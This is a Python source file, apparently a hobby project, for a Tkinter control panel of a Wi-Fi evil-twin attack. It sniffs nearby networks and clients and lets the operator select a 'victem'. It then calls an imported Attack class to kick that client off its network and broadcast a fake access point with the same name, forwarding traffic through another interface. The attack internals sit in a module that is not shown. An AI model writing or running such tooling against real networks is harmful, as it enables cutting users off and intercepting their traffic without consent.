import os
import tkinter as tk
from tkinter import messagebox
from attack import Attack
from time import sleep
import threading
# Sample data
global networks, users
networks = {"aa:bb:cc:dd:ee":("ofek",6),"aa:bb:cc:dd:ff":("ofek2",2)}
users = {"a2:b2:c2:d2:e2":"aa:bb:cc:dd:ee","a1:b1:c1:d1:e1":"aa:bb:cc:dd:ee","a1:b1:c1:d1:f1":"aa:bb:cc:dd:ff"}
attack_card = ""
ap_card = ""
connected_card = ""
running = True

def main():
    global selected_network_var, selected_user_var, selected_network_name_var,atack_object
    selected_network_var = None
    selected_user_var = None
    selected_network_name_var = None
    print("interfaces list:")
    os.system("ip l")
    print("Enter the network interface and mac to use as the attacker")
    attack_card = input()
    attack_mac = input()
    print("Enter the network interface  and mac to use as an AP")
    ap_card = input()  
    ap_mac = input()  
    print("Enter the network interface to forword the AP trafic to")
    connected_card = input()
    # TODO: scan the network for 1 minute 
    #atack_object = Attack(attack_card,attack_mac, ap_card ,ap_mac)
    #'wlx000f005d5479','00:0f:00:5d:54:79'
    atack_object = Attack('wlxc4e9841c43b9','c4:e9:84:1c:43:b9', 'wlx000f005d5479','00:0f:00:5d:54:79')    
    threading.Thread(target=lambda:atack_object.sniff_attack()).start()

main()
print(atack_object.ap_iface)

def attack_start():
    # TODO: Implement the attack function
    if selected_network_var is None:
        messagebox.showerror("Error", "No network selected")
        return
    if selected_user_var is None:
        messagebox.showerror("Error", "No user selected")
        return
    start_attack_button.config(state=tk.DISABLED)
    print("------ ATACKING ------")
    print(selected_network_var, selected_network_name_var ,selected_user_var)
    update_label(f"attack has started\nvictem is {selected_user_var}\nvictem network mac: {selected_network_var}\nvictem network name: {selected_network_name_var}")
    threading.Thread(target=lambda: atack_object.kill_wifi(selected_user_var,selected_network_var)).start()
    atack_object.reset_ap()
    threading.Thread(target=lambda: atack_object.beacon_packet(selected_network_name_var,"enp3s0")).start()
    # TODO: Implement the attack function
    # and close the option to press the button

# Define a function to update the label text
def update_label(new_text):
    label_text.set(new_text)
# Create a Tkinter window
window = tk.Tk()

# Create a label to display the selected network and users
label = tk.Label(window, text="No network selected")
label.pack()


networks_label = tk.Label(window, text="Networks")
networks_label.pack()
# Create a listbox to display the available networks
network_listbox = tk.Listbox(window)
for network,names in networks.items():
    network_listbox.insert(tk.END, network+","+names[0])
network_listbox.pack()

# Get the recommended width and height of the listbox
width = network_listbox.winfo_reqwidth()
height = network_listbox.winfo_reqheight()

# Set the size of the window to be double the size of the listbox
window.geometry(f"{width*2}x{height*3}")

users_label = tk.Label(window, text="Users")
users_label.pack()
# Create a listbox to display the associated users for the selected network
users_listbox = tk.Listbox(window)
users_listbox.pack()

start_attack_button = tk.Button(window, text="Start Attack", command=attack_start)
start_attack_button.pack()

label_text = tk.StringVar()
label_text.set("attack has not started yet")
update_label1 = tk.Label(window, textvariable=label_text)
update_label1.pack()

def update():
    global atack_object, networks,users
    while running:
        networks = atack_object.networks
        users = atack_object.users
        network_listbox.delete(0, tk.END)
        for network,names in networks.items():
            network_listbox.insert(tk.END, network+","+names[0])
        sleep(5)

threading.Thread(target=update).start()
# Function to display the selected network and associated users
def show_users(event):
    if network_listbox.curselection() != ():
        # Get the selected network
        selected_network = network_listbox.get(network_listbox.curselection()[0])
        selected_network_name = selected_network.split(',')[1]
        network_key = selected_network.split(',')[0]
        # Find all users associated with the selected network
        associated_users = [k for k,v in users.items() if v == network_key]
        print(users)
        # Update the label with the selected network and associated users
        label.config(text=f"Selected network: {selected_network_name}\n")
        
        # Update the users listbox with the associated users for the selected network
        users_listbox.delete(0, tk.END)
        for user in associated_users:
            users_listbox.insert(tk.END, user)
        
        # Save the selected network and associated users to variables
        global selected_network_var, selected_user_var, selected_network_name_var
        selected_network_var = network_key
        selected_network_name_var = selected_network_name
        selected_user_var = None
    
# Function to handle the user selection
def select_user(event):
    if users_listbox.curselection() != ():
        # Get the selected user
        selected_user = users_listbox.get(users_listbox.curselection()[0])
        # Update the label with the selected user
        label.config(text=f"Selected network: {selected_network_var}\nSelected user: {selected_user}")
        
        # Save the selected user to a variable
        global selected_user_var
        selected_user_var = selected_user

# Bind the show_users function to the network listbox selection event
network_listbox.bind("<<ListboxSelect>>", show_users)

# Bind the select_user function to the users listbox selection event
users_listbox.bind("<<ListboxSelect>>", select_user)
# Start the Tkinter event loop
window.mainloop()